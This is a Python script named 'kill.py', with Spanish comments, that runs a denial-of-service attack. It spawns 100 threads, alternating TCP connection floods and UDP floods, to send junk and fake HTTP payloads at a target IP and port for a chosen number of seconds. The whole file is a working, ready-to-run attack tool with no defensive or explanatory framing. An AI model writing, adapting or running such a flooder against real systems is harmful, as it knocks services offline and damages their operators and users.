#!/usr/bin/env python3
import sys, os, socket, struct, random, threading, time

class KillMethod:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.threads = []
        
    def tcp_worker(self, worker_id):
        """TCP flood simplificado y robusto"""
        end_time = time.time() + self.duration
        dst = (self.target_ip, self.target_port)
        
        while time.time() < end_time and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                
                # Intentar conexión rápida
                try:
                    sock.connect(dst)
                except:
                    sock.close()
                    continue
                
                # Enviar datos
                payload = b'X' * 1400
                send_start = time.time()
                
                while time.time() < min(end_time, send_start + 3) and self.running:
                    try:
                        sock.send(payload)
                    except:
                        break
                
                sock.close()
                
            except Exception:
                pass
    
    def udp_worker(self, worker_id):
        """UDP flood optimizado"""
        end_time = time.time() + self.duration
        dst = (self.target_ip, self.target_port)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except:
            return
        
        # Payloads variados
        payloads = [
            b'GET / HTTP/1.1\r\nHost: ' + self.target_ip.encode() + b'\r\n\r\n',
            b'\x00' * 512,
            b'\xFF' * 1024,
            os.urandom(768),
            b'A' * 896,
        ]
        
        while time.time() < end_time and self.running:
            try:
                # Enviar ráfaga
                for _ in range(50):
                    payload = random.choice(payloads)
                    try:
                        sock.sendto(payload, dst)
                    except:
                        break
                
                # Pausa mínima
                time.sleep(0.001)
                
            except Exception:
                pass
        
        try:
            sock.close()
        except:
            pass
    
    def start(self):
        """Iniciar ataque"""
        print(f"[+] Target: {self.target_ip}:{self.target_port}")
        print(f"[+] Duration: {self.duration}s")
        print(f"[+] Starting attack...")
        
        # Crear workers
        for i in range(100):  # 50 TCP + 50 UDP
            if i % 2 == 0:
                t = threading.Thread(target=self.tcp_worker, args=(i,))
            else:
                t = threading.Thread(target=self.udp_worker, args=(i,))
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        # Esperar duración
        time.sleep(self.duration)
        
        # Detener
        self.running = False
        
        print(f"\n[+] Attack completed")
    
    def stop(self):
        """Detener ataque"""
        self.running = False

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 kill.py <ip> <port> <seconds>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    attack = KillMethod(target_ip, target_port, duration)
    
    try:
        attack.start()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        attack.stop()